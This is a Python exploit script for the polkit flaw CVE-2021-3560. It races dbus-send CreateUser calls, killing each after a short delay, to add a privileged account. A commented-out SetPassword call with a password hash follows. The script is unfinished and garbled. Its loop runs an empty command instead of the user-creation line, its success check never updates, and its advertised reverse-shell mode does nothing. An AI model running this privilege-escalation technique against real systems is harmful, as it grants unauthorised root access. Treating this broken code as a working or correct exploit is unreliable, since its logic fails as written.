#!/usr/bin/env python3
# Exploit Title: polkit 0.0.0-0.0.0 - Arbitrary Code Execution
# Date: 05/02/2022
# Exploit Author: UNICORD (NicPWNs & Dev-Yeoj)
# Vendor Homepage: https://gitlab.freedesktop.org/polkit/polkit/
# Software Link: 
# Version: 0.0.0-0.0.0
# Tested on: polkit 0.0.0 (Debian)
# CVE: CVE-2021–3560
# Source: https://github.com/UNICORDev/exploit-CVE-2021–3560
# Description: It was found that polkit could be tricked into bypassing the credential checks for D-Bus requests, elevating the privileges of the requestor to the root user.

# Imports
import os
import subprocess
import sys
import hashlib
import time
import timeit

# Class for colors
class color:
    red = '\033[91m'
    gold = '\033[93m'
    blue = '\033[36m'
    green = '\033[92m'
    no = '\033[0m'

# Print UNICORD ASCII Art
def UNICORD_ASCII():
    print(rf"""
{color.red}        _ __,~~~{color.gold}/{color.red}_{color.no}        {color.blue}__  ___  _______________  ___  ___{color.no}
{color.red}    ,~~`( )_( )-\|       {color.blue}/ / / / |/ /  _/ ___/ __ \/ _ \/ _ \{color.no}
{color.red}        |/|  `--.       {color.blue}/ /_/ /    // // /__/ /_/ / , _/ // /{color.no}
{color.green}_V__v___{color.red}!{color.green}_{color.red}!{color.green}__{color.red}!{color.green}_____V____{color.blue}\____/_/|_/___/\___/\____/_/|_/____/{color.green}....{color.no}
    """)

# Print exploit help menu
def help():
    print(r"""UNICORD Exploit for CVE-2021–3560

Usage:
  python3 exploit-CVE-2021–3560.py -c <command>
  python3 exploit-CVE-2021–3560.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021–3560.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021–3560.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021–3560.py -h

Options:
  -c    Custom command mode. Provide command to execute.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (Optional)
  -h    Show this help menu.
""")

# Run the exploit
def exploit(command):

    UNICORD_ASCII()

    print(f"{color.red}RUNNING: {color.blue}UNICORD Exploit for CVE-2021–3560{color.no}")
    print(f"{color.red}PAYLOAD: {color.gold}" + command + f"{color.no}")


    #make sure we can access passwd & shadow file. (We will need to view the size of these later. . .)
    if os.path.isfile("/etc/passwd"):
        print ("Located passwd file. . .")
    else:
        print ("Error locating passwd file")

    if os.path.isfile("/etc/shadow"):
        print ("Located shadow file. . .")
    else:
        print ("Error locating shadow file")

    #time.sleep(3)


    #input variables
    username = input('username: ')
    password = input('Etner passs: ')


    #inform user that if passwd or shadow file is changed this script will fail
    print("If a differnt user or password is changed other than in this program this script will prob fail")
    input('[Press <ENTER> to continue]')


    #gather passwd file size to determine when we successfully add a new user
    print("\n\nGathering passwd file size")
    passwd_size = subprocess.check_output("ls -l /etc/passwd | awk '{print $5}'", shell=True)
    passwd_size = passwd_size.decode("utf-8")
    passwd_size = int(passwd_size)
    print(passwd_size)


    #gather shadow file size to determine if we successfully change the password or not
    print("\n\nGathering shadow file size")
    shadow_size = subprocess.check_output("ls -l /etc/shadow | awk '{print $5}'", shell=True)
    shadow_size = shadow_size.decode("utf-8")
    shadow_size = int(shadow_size)
    print(shadow_size)

    #Check for flavor of linux


    #Check for installed services



    #run ex ----------------->


    #Loop to create user with trail and error timing

    success = 0
    cutoff_time = 0.001
    loopcount = 0
    passwd_size_new = passwd_size
    shadow_size_new = shadow_size

    test_command = "/bin/bash -c time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:\"Boris Ivanovich Grishenko\" int32:1"
    test_run_command = subprocess.run(test_command, capture_output=True, shell=True)
    print(test_run_command.stderr.decode())


    while success != 1:
        time.sleep(0.01)
        cutoff_time_s = str(round(cutoff_time, 3))

        #problem with this command: dbus-send appears to be running fine but when running the '& sleep' portion, the python script does not sleep telling me that its either skipping over that part or its not being passed to the OS correctly idk
        #command works by copy+paste in terminal but python is having some problem with this
        #requirnment: The dbus command 'process' must be killed halfway through its execution. However that happens doesn't really matter as long as it happens
        command_makeuser = "dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:batchest string:\"batchest man\" int32:1 & sleep 0.013s" + " ; kill $!"
        run_command = subprocess.run(command, capture_output=True, shell=True)
        print(cutoff_time_s)

        if cutoff_time > 0.030:
            cutoff_time = 0.001
        if loopcount > 5000:
            break
        if passwd_size != passwd_size_new:
            print("User added!")
            success = 1
        loopcount += 1
        cutoff_time += 0.001

    #confirm user is in sudo
    subprocess.call(['id', username])


    #create password hash



    #User password
    #subprocess.check_output("dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB' string:GoldenEye & sleep 0.008s ; kill $!", shell=True)




    print(f"{color.red}RUNTIME: {color.green}DONE - Exploit performed action.{color.no}\n")

    exit()

if __name__ == "__main__":

    args = ['-h','-c','-s','-i']

    if args[0] in sys.argv:
        help()

    elif args[1] in sys.argv and not args[2] in sys.argv:
        command = ""
        exploit(command)

    elif args[2] in sys.argv and not args[1] in sys.argv:
        command = ""
        exploit(command)

    else:
        help()
